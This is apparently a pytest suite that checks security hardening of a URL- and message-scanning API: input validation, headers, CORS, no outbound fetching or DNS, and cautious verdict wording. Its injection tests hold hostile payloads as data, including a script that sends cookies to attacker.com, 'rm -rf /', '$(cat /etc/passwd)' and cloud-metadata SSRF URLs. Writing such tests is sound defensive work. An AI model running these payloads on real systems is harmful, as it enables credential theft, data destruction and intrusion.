"""
Security, Privacy, Input Validation, and Quality Hardening Tests (T-06).

Verifies:
  1. Submitted URLs are never opened, fetched, crawled, resolved, or previewed.
  2. Raw submissions (URLs, messages) are never persisted, logged, or reflected in errors.
  3. Input sizes, types, and whitespace-only submissions are strictly validated (422).
  4. HTML / script / SQL injection payloads are handled safely without reflection or execution.
  5. CORS is restricted to intended origins and rejects unauthorized origins.
  6. Standard security headers (X-Content-Type-Options, X-Frame-Options, Referrer-Policy) are present.
  7. Internal errors do not expose stack traces or internal secrets.
  8. Model and rule indicators remain separate; message analysis never claims ML.
  9. Responses avoid definitive "safe" claims; cautious terminology is used.
"""

from __future__ import annotations

import socket
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.schemas import RiskCategory, AnalysisMethod

client = TestClient(app, raise_server_exceptions=False)


# ══════════════════════════════════════════════════════════════════════════════
# 1. No raw input reflection in validation errors (422)
# ══════════════════════════════════════════════════════════════════════════════


def test_oversized_url_does_not_reflect_raw_input_in_422() -> None:
    """An oversized URL (> 2048 chars) must not have its raw input echoed back."""
    secret_marker = "SECRET_TOKEN_DO_NOT_REFLECT_URL"
    oversized_url = f"https://example.com/{secret_marker}_" + ("a" * 2100)
    response = client.post("/api/analyze/url", json={"url": oversized_url})
    assert response.status_code == 422
    assert secret_marker not in response.text


def test_oversized_message_does_not_reflect_raw_input_in_422() -> None:
    """An oversized message (> 5000 chars) must not have its raw input echoed back."""
    secret_marker = "SECRET_CREDENTIAL_DO_NOT_REFLECT_MSG"
    oversized_msg = f"{secret_marker} " + ("x" * 5100)
    response = client.post("/api/analyze/message", json={"message": oversized_msg})
    assert response.status_code == 422
    assert secret_marker not in response.text


def test_control_character_url_does_not_reflect_raw_input() -> None:
    """A URL containing control characters must be rejected without echoing the URL."""
    secret_marker = "SENSITIVE_PATH_TOKEN_123"
    bad_url = f"https://example.com/\x01\x02{secret_marker}"
    response = client.post("/api/analyze/url", json={"url": bad_url})
    assert response.status_code == 422
    assert secret_marker not in response.text


def test_malformed_json_does_not_reflect_sensitive_payload() -> None:
    """Malformed JSON syntax must be rejected with 422 and no raw reflection."""
    secret_marker = "SUPER_SECRET_UNPARSED_PAYLOAD"
    response = client.post(
        "/api/analyze/url",
        content=f'{{"url": "{secret_marker}", "language": '.encode(),
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code == 422
    assert secret_marker not in response.text


# ══════════════════════════════════════════════════════════════════════════════
# 2. Strict input validation (empty, whitespace-only, malformed types)
# ══════════════════════════════════════════════════════════════════════════════


def test_whitespace_only_url_rejected_with_422() -> None:
    """Whitespace-only URLs must be rejected with 422, not treated as valid."""
    for ws in ["   ", "\t\t", " \n \r "]:
        response = client.post("/api/analyze/url", json={"url": ws})
        assert response.status_code == 422, f"Failed for whitespace: {ws!r}"


def test_whitespace_only_message_rejected_with_422() -> None:
    """Whitespace-only messages must be rejected with 422, not treated as valid."""
    for ws in ["   ", "\t\t", " \n\n \r "]:
        response = client.post("/api/analyze/message", json={"message": ws})
        assert response.status_code == 422, f"Failed for whitespace: {ws!r}"


def test_invalid_data_types_rejected_with_422() -> None:
    """Passing integer, array, or boolean instead of string must return 422."""
    assert client.post("/api/analyze/url", json={"url": 12345}).status_code == 422
    assert client.post("/api/analyze/url", json={"url": ["https://example.com"]}).status_code == 422
    assert client.post("/api/analyze/url", json={"url": None}).status_code == 422
    assert client.post("/api/analyze/message", json={"message": True}).status_code == 422
    assert client.post("/api/analyze/message", json={"message": {"nested": "obj"}}).status_code == 422


# ══════════════════════════════════════════════════════════════════════════════
# 3. Security headers enforcement
# ══════════════════════════════════════════════════════════════════════════════


def test_security_headers_on_health() -> None:
    """Verify security headers on /health."""
    response = client.get("/health")
    assert response.status_code == 200
    assert response.headers.get("X-Content-Type-Options") == "nosniff"
    assert response.headers.get("X-Frame-Options") == "DENY"
    assert response.headers.get("Referrer-Policy") == "no-referrer"


def test_security_headers_on_url_analysis() -> None:
    """Verify security headers on /api/analyze/url."""
    response = client.post("/api/analyze/url", json={"url": "https://example.com"})
    assert response.status_code == 200
    assert response.headers.get("X-Content-Type-Options") == "nosniff"
    assert response.headers.get("X-Frame-Options") == "DENY"
    assert response.headers.get("Referrer-Policy") == "no-referrer"


def test_security_headers_on_message_analysis() -> None:
    """Verify security headers on /api/analyze/message."""
    response = client.post("/api/analyze/message", json={"message": "Meeting at 3pm."})
    assert response.status_code == 200
    assert response.headers.get("X-Content-Type-Options") == "nosniff"
    assert response.headers.get("X-Frame-Options") == "DENY"
    assert response.headers.get("Referrer-Policy") == "no-referrer"


# ══════════════════════════════════════════════════════════════════════════════
# 4. CORS restrictions (intended origins allowed, unauthorized blocked)
# ══════════════════════════════════════════════════════════════════════════════


def test_cors_allows_configured_origins() -> None:
    """Configured origins must receive Access-Control-Allow-Origin."""
    for origin in ["http://localhost:5173", "http://127.0.0.1:5173"]:
        response = client.post(
            "/api/analyze/url",
            json={"url": "https://example.com"},
            headers={"Origin": origin},
        )
        assert response.headers.get("access-control-allow-origin") == origin


def test_cors_rejects_unauthorized_origins() -> None:
    """Unauthorized origins must NOT receive Access-Control-Allow-Origin."""
    for bad_origin in ["http://evil.com", "https://malicious-site.org", "http://localhost:9999"]:
        response = client.post(
            "/api/analyze/url",
            json={"url": "https://example.com"},
            headers={"Origin": bad_origin},
        )
        assert response.headers.get("access-control-allow-origin") is None


# ══════════════════════════════════════════════════════════════════════════════
# 5. Invariant: URLs are never opened, fetched, or resolved
# ══════════════════════════════════════════════════════════════════════════════


def test_internal_and_cloud_metadata_urls_never_contacted() -> None:
    """
    Submitting private, localhost, or cloud metadata endpoints
    (SSRF targets) must be analyzed locally without error.
    """
    ssrf_targets = [
        "http://127.0.0.1:8000/internal-admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]:8080/metrics",
        "http://192.168.1.1/router-login",
    ]
    for target in ssrf_targets:
        response = client.post("/api/analyze/url", json={"url": target})
        assert response.status_code == 200
        data = response.json()
        assert "category" in data
        assert "method" in data


def test_nonexistent_domains_evaluated_locally_without_dns(monkeypatch) -> None:
    """
    Submitting non-resolvable domains must succeed locally without triggering
    getaddrinfo or gethostbyname.
    """
    def fake_dns(*args, **kwargs):
        raise AssertionError("DNS resolution attempted! Invariant violated.")

    monkeypatch.setattr(socket, "getaddrinfo", fake_dns)
    monkeypatch.setattr(socket, "gethostbyname", fake_dns)

    fake_url = "https://this-domain-definitely-does-not-exist-998877665544.xyz/login"
    response = client.post("/api/analyze/url", json={"url": fake_url})
    assert response.status_code == 200
    data = response.json()
    assert data["category"] in [c.value for c in RiskCategory]


# ══════════════════════════════════════════════════════════════════════════════
# 6. Injection handling (HTML, script, SQL, command injection)
# ══════════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "http://test.com/<img src=x onerror=alert(1)>",
        "' OR '1'='1",
        "http://localhost:8000; rm -rf /",
        "https://example.com/?q=${7*7}&cmd=`whoami`",
    ],
)
def test_injection_payloads_in_url_handled_safely(payload: str) -> None:
    """Injection payloads in URLs must be parsed safely without crashing or reflecting."""
    response = client.post("/api/analyze/url", json={"url": payload})
    assert response.status_code == 200
    data = response.json()
    # Ensure raw input is not in response fields
    assert payload not in data.get("summary", "")
    assert payload not in data.get("disclaimer", "")


@pytest.mark.parametrize(
    "payload",
    [
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "SELECT * FROM users WHERE '1'='1';",
        "$(cat /etc/passwd)",
    ],
)
def test_injection_payloads_in_message_handled_safely(payload: str) -> None:
    """Injection payloads in messages must be parsed safely without crashing or reflecting."""
    response = client.post("/api/analyze/message", json={"message": payload})
    assert response.status_code == 200
    data = response.json()
    assert payload not in data.get("summary", "")


# ══════════════════════════════════════════════════════════════════════════════
# 7. Model/rules separation and cautious claims
# ══════════════════════════════════════════════════════════════════════════════


def test_url_method_discloses_source() -> None:
    """URL analysis method must disclose whether ML, rules, or both were used."""
    response = client.post("/api/analyze/url", json={"url": "https://example.com"})
    assert response.status_code == 200
    data = response.json()
    assert data["method"] in [
        AnalysisMethod.ml_model.value,
        AnalysisMethod.ml_model_and_rules.value,
        AnalysisMethod.rules.value,
    ]


def test_message_method_is_strictly_rules() -> None:
    """Message analysis must strictly return 'rules' and never claim an ML model."""
    response = client.post(
        "/api/analyze/message",
        json={"message": "Please send your OTP to complete KYC immediately."},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["method"] == AnalysisMethod.rules.value
    assert "No ML classifier is used for message analysis" in data["disclaimer"]


def test_no_definitive_safe_claims_in_responses() -> None:
    """Neither URL nor message analysis should ever return 'Safe' as a category."""
    for endpoint, payload in [
        ("/api/analyze/url", {"url": "https://www.google.com"}),
        ("/api/analyze/message", {"message": "Hello, how are you today?"}),
    ]:
        response = client.post(endpoint, json=payload)
        assert response.status_code == 200
        data = response.json()
        assert data["category"] != "Safe"
        assert data["category"] != "safe"
        assert "100% safe" not in data["summary"].lower()
        summary_lower = data["summary"].lower()
        assert (
            "does not guarantee" in summary_lower
            or "not a guarantee" in summary_lower
            or "guarantee" not in summary_lower
        )


# ══════════════════════════════════════════════════════════════════════════════
# 8. Rule indicators for URLs without scheme
# ══════════════════════════════════════════════════════════════════════════════


def test_url_without_scheme_flags_rule_indicators() -> None:
    """A URL submitted without http/https (e.g. www.phishing-test.xyz/login) should still parse hostname."""
    url = "www.phishing-test.xyz/login"
    response = client.post("/api/analyze/url", json={"url": url})
    assert response.status_code == 200
    data = response.json()
    codes = [ind["code"] for ind in data["indicators"]]
    # Should detect suspicious TLD (.xyz) or keywords
    assert any(c in codes for c in ["suspicious_tld", "phishing_keywords_in_path", "hyphen_in_domain"])
